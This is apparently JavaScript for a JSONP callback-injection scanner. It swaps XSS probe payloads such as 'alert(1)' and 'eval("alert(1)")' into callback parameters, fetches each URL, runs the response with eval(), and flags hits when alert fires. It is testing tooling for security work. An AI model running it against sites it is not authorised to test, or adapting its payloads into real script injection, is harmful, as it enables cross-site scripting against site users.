  const originalAlert = window.alert;

const replacementValues = [
  "alert", "alert(1)", '-alert`1`-', 'alert(1)//', 'alert();', 'alert(1)-', 'eval("alert(1)")', 'Function("alert(1)")()'
];
  const jsonpParams = [
    'callback', 'jsonpCallback', 'jsonp', 'callback_func', 'func', 
    'handler', 'jsonp_handler', 'cbfn', 'onload', 'j', 'oncomplete'
  ];

  function generateVariations(url) {
    const variations = [];
    const urlObj = new URL(url);
    const params = new URLSearchParams(urlObj.search);

    jsonpParams.forEach(param => {
      if (params.has(param)) {
        replacementValues.forEach(replacement => {
          const modifiedParams = new URLSearchParams(params);
          modifiedParams.set(param, replacement);
          const modifiedUrl = `${urlObj.origin}${urlObj.pathname}?${modifiedParams.toString()}`;
          variations.push(modifiedUrl);
        });
      }
    });

    return variations;
  }

  function hookAlert(row) {
    window.alert = function(...args) {
      row.querySelector('.status').innerHTML = '<span class="success">✔</span>';
      originalAlert.apply(window, args);
    };
  }

  function highlightJsonpParams(url) {
    jsonpParams.forEach(param => {
      const regex = new RegExp(`(${param}=)([^&]*)`, 'g');
      url = url.replace(regex, (match, p1, p2) => {
        return `${p1}<span class="jsonp-parameter">${p2}</span>`;
      });
    });
    return url;
  }

async function processAndDisplayVariations(url) {
  const variations = generateVariations(url);
  const tableBody = document.querySelector('#table-body');

  for (let modifiedUrl of variations) {
    const row = document.createElement('tr');
    const highlightedUrl = highlightJsonpParams(modifiedUrl);
    row.innerHTML = 
      `<td><button class="copy-btn">Copy</button></td>
      <td>${highlightedUrl}</td>
      <td class="status"><span class="failure">✘</span></td>`;
    tableBody.appendChild(row);

    // Attach event listener programmatically
    const copyButton = row.querySelector('.copy-btn');
    copyButton.addEventListener('click', () => copyToClipboard(modifiedUrl));

    hookAlert(row);
    await injectScript(modifiedUrl, row);
  }
}

function injectScript(url, row) {
  return fetch(url)
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      return response.text();
    })
    .then(text => {
      try {
        eval(text);  // This will execute the JSONP response if it's valid JS
      } catch (e) {
        // Optionally log errors, but don't mark as failure yet—alert hook will handle success
      }
    })
    .catch(() => {
      // Mark as failure if fetch fails (e.g., network error, invalid URL)
      row.querySelector('.status').innerHTML = '<span class="failure">✘</span>';
    });
}

  function copyToClipboard(url) {
    navigator.clipboard.writeText(url);
  }

  // Get base64 string from fragment and decode
  const base64Fragment = window.location.hash.slice(1); // remove leading '#'
  if (base64Fragment) {
    try {
      const decodedUrl = atob(base64Fragment);
      processAndDisplayVariations(decodedUrl);
    } catch (e) {
      console.error("Invalid base64 URL fragment");
    }
  } else {
    console.warn("No URL fragment found");
  }
